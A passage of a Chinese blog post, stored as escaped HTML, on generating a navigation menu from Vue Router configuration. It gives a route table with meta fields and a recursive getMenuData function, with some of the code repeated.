class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> router = <span class=\"keyword\">new</span> Router(&#123;</span><br><span class=\"line\">  mode: <span class=\"string\">\"history\"</span>,</span><br><span class=\"line\">  base: process.env.BASE_URL,</span><br><span class=\"line\">  routes: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./layouts/UserLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/user/login\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/login\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"login\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Login.vue\"</span>)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/register\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"register\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Register.vue\"</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">      meta: &#123; <span class=\"attr\">authority</span>: [<span class=\"string\">\"user\"</span>, <span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"basic\" */</span> <span class=\"string\">\"./layouts/BasicLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/dashboard/analysis\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// dashboard</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/dashboard\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"dashboard\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"dashboard\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"仪表盘\"</span> &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/dashboard/analysis\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"analysis\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分析页\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"dashboard\" */</span> <span class=\"string\">\"./views/Dashboard/Analysis.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// form</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/form\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"form\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"form\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"表单\"</span>, <span class=\"attr\">authority</span>: [<span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/basic-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"basic-form\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"基础表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/BasicForm.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"step-form\"</span>,</span><br><span class=\"line\">              hideChildrenInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分布表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm.vue\"</span></span><br><span class=\"line\">                ),</span><br><span class=\"line\">              children: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">                  redirect: <span class=\"string\">\"/form/step-form/info\"</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/info\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"info\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step1\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/confirm\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"confirm\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step2\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/result\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"result\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step3\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/403\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"403\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: Fobidden</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"*\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"404\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: NotFound</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"提取菜单显示所需信息\"><a href=\"#提取菜单显示所需信息\" class=\"headerlink\" title=\"提取菜单显示所需信息\"></a>提取菜单显示所需信息</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getMenuData(routes = [], parentKeys = [], selectedKey) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> menuData = [];</span><br><span class=\"line\">  routes.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (element.name &amp;&amp; !element.hideInMenu) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.openKeysMap[element.path] = parentKeys;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.selectedKeysMap[element.path] = [selectedKey || element.path];</span><br><span class=\"line\">      <span class=\"keyword\">const</span> newItem = &#123; ...element &#125;;</span><br><span class=\"line\">      <span class=\"keyword\">delete</span> newItem.children;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (element.children &amp;&amp; !element.hideChildrenInMenu) &#123;</span><br><span class=\"line\">        newItem.children = <span class=\"keyword\">this</span>.getMenuData(element.children, [</span><br><span class=\"line\">          ...parentKeys,</span><br><span class=\"line\">          element.path</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.getMenuData(</span><br><span class=\"line\">          element.children,</span><br><span class=\"line\">          selectedKey ? parentKeys : [...parentKeys, element.path],</span><br><span class=\"line\">          selectedKey || element.path</span><br><span class=\"line\">        );</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      menuData.push(newItem);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (</span><br><span class=\"line\">      !element.hideInMenu &amp;&amp;</span><br><span class=\"line\">      !element.hideChildrenInMenu &amp;&amp;</span><br><span class=\"line\">      element.children</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">      menuData.push(</span><br><span class=\"line\">        ...this.getMenuData(element.children, [...parentKeys, element.path])</span><br><span class=\"line\">      );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> menuData;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>整体思路就是在每个路由下面增加 meta 属性维护需要在菜单显示的数据，例如<code>meta: { icon: &quot;dashboard&quot;, title: &quot;仪表盘&quot; }</code>，以及加些标志位区分需要过滤掉的路由，然后遍历<code>routes</code>获取相关数据，最后页面渲染显示。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"路由配置参考\"><a href=\"#路由配置参考\" class=\"headerlink\" title=\"路由配置参考\"></a>路由配置参考</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> router = <span class=\"keyword\">new</span> Router(&#123;</span><br><span class=\"line\">  mode: <span class=\"string\">\"history\"</span>,</span><br><span class=\"line\">  base: process.env.BASE_URL,</span><br><span class=\"line\">  routes: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./layouts/UserLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/user/login\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/login\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"login\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Login.vue\"</span>)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/register\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"register\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Register.vue\"</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">      meta: &#123; <span class=\"attr\">authority</span>: [<span class=\"string\">\"user\"</span>, <span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"basic\" */</span> <span class=\"string\">\"./layouts/BasicLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/dashboard/analysis\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// dashboard</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/dashboard\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"dashboard\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"dashboard\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"仪表盘\"</span> &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/dashboard/analysis\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"analysis\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分析页\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"dashboard\" */</span> <span class=\"string\">\"./views/Dashboard/Analysis.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// form</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/form\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"form\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"form\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"表单\"</span>, <span class=\"attr\">authority</span>: [<span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/basic-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"basic-form\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"基础表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/BasicForm.vue\"</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"step-form\"</span>,</span><br><span class=\"line\">              hideChildrenInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分布表单\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                  <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm.vue\"</span></span><br><span class=\"line\">                ),</span><br><span class=\"line\">              children: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form\"</span>,</span><br><span class=\"line\">                  redirect: <span class=\"string\">\"/form/step-form/info\"</span></span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/info\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"info\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step1\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/confirm\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"confirm\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step2\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  path: <span class=\"string\">\"/form/step-form/result\"</span>,</span><br><span class=\"line\">                  name: <span class=\"string\">\"result\"</span>,</span><br><span class=\"line\">                  component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">                    <span class=\"keyword\">import</span>(</span><br><span class=\"line\">                      <span class=\"comment\">/* webpackChunkName: \"form\" */</span> <span class=\"string\">\"./views/Forms/StepForm/Step3\"</span></span><br><span class=\"line\">                    )</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              ]</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          ]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/403\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"403\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: Fobidden</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"*\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"404\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: NotFound</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"提取菜单显示所需信息\"><a href=\"#提取菜单显示所需信息\" class=\"headerlink\" title=\"提取菜单显示所需信息\"></a>提取菜单显示所需信息</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getMenuData(routes = [], parentKeys = [], selectedKey) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> menuData = [];</span><br><span class=\"line\">  routes.forEach(<span class=\"function\"><span 